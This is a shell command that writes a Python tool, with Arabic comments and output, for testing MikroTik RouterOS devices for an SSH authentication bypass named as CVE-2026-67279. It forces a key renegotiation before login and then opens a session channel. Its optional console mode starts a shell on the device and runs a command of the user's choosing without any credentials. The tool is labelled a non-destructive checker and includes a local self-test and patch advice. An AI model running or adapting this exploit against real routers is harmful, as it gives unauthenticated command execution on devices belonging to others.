mkdir -p ~/mikrotrick && cd ~/mikrotrick && cat > mtx.py << 'PYEOF'
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# mtx.py — تحقق غير تدميري من CVE-2026-67279 (MikroTrick) — نسخة Termux
# السلامة: لا حسابات، لا كتابة ملفات على الهدف، لا أوامر إلا مع --console (قراءة فقط).
import argparse, json, socket, sys, threading, time
from datetime import datetime, timezone

try:
    import paramiko
except ImportError:
    print("\n[!] مكتبة الاتصال SSH غير مثبتة بعد.")
    print("    على Termux نفّذ هذه الأوامر ثم أعد المحاولة:\n")
    print("      pkg update -y && pkg install python python-pip -y")
    print("      pip install paramiko")
    print("\n    إن فشل التثبيت عند بناء مكتبة التشفير، فنفّذ أولًا:\n")
    print("      pkg install python-cryptography rust binutils libffi openssl -y")
    print("      pip install paramiko\n")
    sys.exit(3)

# ---------------------------------------------------------------------------
#  لاحقة الفحص الذاتي (--selftest): خادمات SSH مصغّرة داخل نفس العملية.
#  تختبر منطق الحكم بلا أي شبكة خارجية ولا أي جهاز حقيقي.
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    _sr = globals()
    try:
        import paramiko as _pmk
        from paramiko import Transport as _T, ServerInterface as _SI
        from paramiko import AUTH_SUCCESSFUL as _AS, OPEN_SUCCEEDED as _OS

        class _Srv(_SI):
            def check_auth_password(self, u, p):
                return _AS

            def check_channel_request(self, k, i):
                return _OS if k == "session" else _pmk.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

            def check_channel_pty_request(self, *a, **k):
                return True

            def check_channel_shell_request(self, c):
                return True

            def get_allowed_auths(self, u):
                return "password,publickey"

        class _Vuln(_T):
            def _ensure_authed(self, ptype, message):
                return None

        class _Patched(_T):
            def _parse_kex_init(self, m):
                if self.initial_kex_done and not self.is_authenticated():
                    raise _pmk.SSHException("pre-auth rekey rejected")
                return super()._parse_kex_init(m)

        _sr["_Srv"], _sr["_Vuln"] = _Srv, _Vuln
    except Exception:
        _sr["_Srv"] = _sr["_Vuln"] = None


def selftest():
    """فحص ذاتي محلي: 3 خادمات وهمية (غير مُرقَّع / مُرقَّع / عادي)."""
    global _Srv, _Vuln, _Patched
    try:
        import logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    except Exception:
        pass
    if _Srv is None:
        print("[!] تعذّر تحميل مكوّنات الفحص الذاتي.")
        return 3
    cases = [
        ("غير مُرقَّع", _Vuln, "VULNERABLE"),
        ("مُرقَّع", _Patched, "PATCHED_SIGNATURE"),
        ("عادي", paramiko.Transport, "NOT_CONFIRMED"),
    ]
    key = paramiko.RSAKey.generate(2048)
    ok = 0
    print(L)
    print(" فحص ذاتي محلي — بلا شبكة وبلا أي جهاز حقيقي")
    print(L)
    for name, cls, exp in cases:
        ls = socket.socket()
        ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        ls.bind(("127.0.0.1", 0))
        port = ls.getsockname()[1]
        ls.listen(8)
        ls.settimeout(0.3)
        stop = threading.Event()

        def worker(cs, cls=cls):
            try:
                tt = cls(cs)
                tt.add_server_key(key)
                tt.start_server(server=_Srv())
                end = time.time() + 8
                while tt.is_active() and time.time() < end and not stop.is_set():
                    time.sleep(0.15)
                tt.close()
            except Exception:
                pass
            finally:
                try:
                    cs.close()
                except Exception:
                    pass

        def loop():
            while not stop.is_set():
                try:
                    cs, _ = ls.accept()
                except socket.timeout:
                    continue
                except Exception:
                    break
                threading.Thread(target=worker, args=(cs,), daemon=True).start()
            try:
                ls.close()
            except Exception:
                pass

        threading.Thread(target=loop, daemon=True).start()
        time.sleep(0.4)
        b = probe("127.0.0.1", port, 5, False)
        r = probe("127.0.0.1", port, 5, True)
        v, _ = decide(b, r)
        good = v == exp
        ok += good
        print("  %-10s المتوقع %-18s الناتج %-18s %s"
              % (name, exp, v, "PASS ✓" if good else "FAIL ✗"))
        stop.set()
        time.sleep(0.25)
    print(L)
    print(" النتيجة: %d/3" % ok)
    print(" 3/3 = الأداة ومنطق الحكم سليمان تمامًا." if ok == 3 else
          " [!] النتيجة غير كاملة — أعد التشغيل قبل لمس أي جهاز.")
    print(L)
    return 0 if ok == 3 else 1


L = "=" * 58
AR = {
    "VULNERABLE": "مُصاب — تجاوز المصادقة مؤكَّد على هذا الجهاز",
    "PATCHED_SIGNATURE": "محمي/مُرقَّع — رُفضت إعادة التفاوض قبل المصادقة",
    "NOT_CONFIRMED": "لم يُثبَت — الخادم رفض القناة بلا مصادقة",
    "UNREACHABLE": "غير قابل للوصول",
    "INCONCLUSIVE": "غير قاطع — يحتاج مراجعة يدوية",
}


def bann(h, p, t):
    try:
        s = socket.create_connection((h, p), timeout=t)
        s.settimeout(t)
        d = s.recv(255).decode("utf-8", "replace").strip()
        s.close()
        return d
    except Exception as e:
        return "<unavailable: %s>" % e


def nt(h, p, t):
    s = socket.create_connection((h, p), timeout=t)
    s.settimeout(t)
    tr = paramiko.Transport(s)
    tr.banner_timeout = t
    tr.auth_timeout = t
    tr.channel_timeout = t
    tr.completion_event = None
    tr.start_client(timeout=t)   # جلسة خشنة بلا أي مصادقة
    return tr


def probe(h, p, t, rekey, con=False, cmd="/system resource print"):
    r = {"connected": False, "conn_err": "", "rekey_ok": None, "rekey_err": "",
         "chan": False, "chan_err": "", "out": ""}
    tr = None
    try:
        tr = nt(h, p, t)
        r["connected"] = True
        if rekey:
            try:
                tr.renegotiate_keys()
                r["rekey_ok"] = True
            except Exception as e:
                r["rekey_ok"] = False
                r["rekey_err"] = "%s: %s" % (type(e).__name__, e)
                return r
        try:
            ch = tr.open_channel("session", timeout=t)
            r["chan"] = True
            if con:
                try:
                    ch.get_pty()
                    ch.invoke_shell()
                    time.sleep(1.0)
                    ch.sendall((cmd + "\n").encode())
                    time.sleep(1.5)
                    ch.settimeout(2.0)
                    buf = []
                    while True:
                        try:
                            b = ch.recv(4096)
                        except Exception:
                            break
                        if not b:
                            break
                        buf.append(b)
                    r["out"] = b"".join(buf).decode("utf-8", "replace")
                except Exception as e:
                    r["chan_err"] += " console: %s: %s" % (type(e).__name__, e)
            try:
                ch.close()
            except Exception:
                pass
        except Exception as e:
            r["chan_err"] = "%s: %s" % (type(e).__name__, e)
    except Exception as e:
        r["conn_err"] = "%s: %s" % (type(e).__name__, e)
    finally:
        if tr is not None:
            try:
                tr.close()
            except Exception:
                pass
    return r


def decide(b, r):
    if not b["connected"] and not r["connected"]:
        return "UNREACHABLE", "تعذّر الوصول إلى منفذ SSH على الهدف."
    if r["connected"] and r["chan"]:
        return "VULNERABLE", ("بعد إعادة التفاوض قبل المصادقة، قبل الخادم فتح قناة جلسة رغم "
                              "غياب المصادقة — سلوك CVE-2026-67279 على بناء غير مُرقَّع.")
    if r["connected"] and r["rekey_ok"] is False:
        return "PATCHED_SIGNATURE", ("رُفضت إعادة التفاوض قبل المصادقة وقُطع الاتصال — بصمة "
                                     "الإصدار المُرقَّع الذي يفرض سياسة جلسة قبل معالجة رسائل طبقة الاتصال.")
    if r["connected"] and r["rekey_ok"] is True and not r["chan"]:
        return "NOT_CONFIRMED", ("نجحت إعادة التفاوض لكن رُفض فتح القناة بلا مصادقة — سلوك "
                                 "خادم سليم، لم يُثبَت الاستغلال.")
    return "INCONCLUSIVE", "النتائج لا تسمح بحكم قاطع؛ راجع التفاصيل الخام أدناه."


def yn(v):
    return "نعم" if v else "لا"


def main():
    ap = argparse.ArgumentParser(description="تحقق غير تدميري من CVE-2026-67279 (Termux)")
    ap.add_argument("host", nargs="?", help="عنوان جهاز RouterOS الذي تملكه أو لديك تفويض باختباره")
    ap.add_argument("--selftest", action="store_true",
                    help="فحص ذاتي محلي بلا شبكة (شغّله أول مرة للتأكد أن الأداة تعمل)")
    ap.add_argument("--port", type=int, default=22, help="منفذ SSH، افتراضي 22")
    ap.add_argument("--timeout", type=float, default=8.0, help="مهلة الاتصال بالثواني")
    ap.add_argument("--console", action="store_true", help="اختياري: أمر قراءة فقط على جهاز مُصاب")
    ap.add_argument("--cmd", default="/system resource print", help="الأمر في وضع --console")
    ap.add_argument("--json", dest="jo", default="", help="حفظ التقرير بصيغة JSON")
    a = ap.parse_args()

    if a.selftest:
        return selftest()
    if not a.host:
        ap.error("مطلوب عنوان الجهاز، أو استخدم --selftest للفحص الذاتي")

    print(L)
    print(" mikrotrick — تحقق غير تدميري من CVE-2026-67279")
    print(" الهدف: %s:%d" % (a.host, a.port))
    print(L)
    bb = bann(a.host, a.port, a.timeout)
    print("[i] شعار الخادم: %s" % bb)
    print("[i] RouterOS لا يُفصح عن إصداره في الشعار، لذا الحكم سلوكي.\n")

    print("[A] خط الأساس — فتح قناة بلا مصادقة وبدون إعادة تفاوض ...")
    b = probe(a.host, a.port, a.timeout, False)
    print("    الاتصال        : %s" % yn(b["connected"]))
    print("    القناة مفتوحة  : %s" % yn(b["chan"]))
    if b["chan_err"]:
        print("    خطأ القناة     : %s" % b["chan_err"])

    print("\n[B] الاختبار — إعادة تفاوض قبل المصادقة ثم فتح قناة ...")
    r = probe(a.host, a.port, a.timeout, True, a.console, a.cmd)
    print("    الاتصال        : %s" % yn(r["connected"]))
    print("    إعادة التفاوض : %s" % ("نجحت" if r["rekey_ok"] else "فشلت/رُفضت"))
    if r["rekey_err"]:
        print("    تفصيل التفاوض  : %s" % r["rekey_err"])
    if r["conn_err"]:
        print("    تفصيل الاتصال  : %s" % r["conn_err"])
    print("    القناة مفتوحة  : %s" % yn(r["chan"]))
    if r["chan_err"]:
        print("    خطأ القناة     : %s" % r["chan_err"])
    if r["out"]:
        print("    مخرجات الطرفية (قراءة فقط):")
        for ln in r["out"].splitlines():
            print("      | %s" % ln)

    v, why = decide(b, r)
    print("\n" + L)
    print(" الحكم: %s — %s" % (v, AR.get(v, "")))
    print(" التفسير: %s" % why)
    print(L)
    if v == "VULNERABLE":
        print("\n>> الإجراء: هذا البناء يعاني من المرحلة الأولى من MikroTrick.")
        print("   - فرع 6.x: التلاعب بملفات RouterOS صار ممكنًا دون مصادقة.")
        print("   - فرع 7.x: قد تكتمل السيطرة الإدارية مع CVE-2026-86060.")
        print("   - المطلوب: 6.49.21 (فرع 6) أو 7.23.6 / 7.24.3+ (فرع 7)،")
        print("     ثم تدقيق المستخدمين والسكربتات والمهام المجدولة والملفات.")
    elif v == "PATCHED_SIGNATURE":
        print("\n>> الإجراء: السلوك يطابق البناء المُرقَّع. أعد الفحص على جهاز تحكّم مطابق")
        print("   لتأكيد تمييز الأداة بين البناءين، ثم أكمل تدقيق ما بعد الأثر.")

    if a.jo:
        json.dump({"tool": "mikrotrick_termux", "cve": "CVE-2026-67279",
                   "target": "%s:%d" % (a.host, a.port),
                   "timestamp_utc": datetime.now(timezone.utc).isoformat(),
                   "banner": bb, "baseline": b, "rekey_test": r, "verdict": v,
                   "verdict_ar": AR.get(v, ""), "rationale": why,
                   "safety": "non-destructive; no accounts; no files written; no persistence"},
                  open(a.jo, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
        print("\n[i] حُفظ التقرير: %s" % a.jo)
    return 0 if v != "UNREACHABLE" else 2


if __name__ == "__main__":
    sys.exit(main())
PYEOF
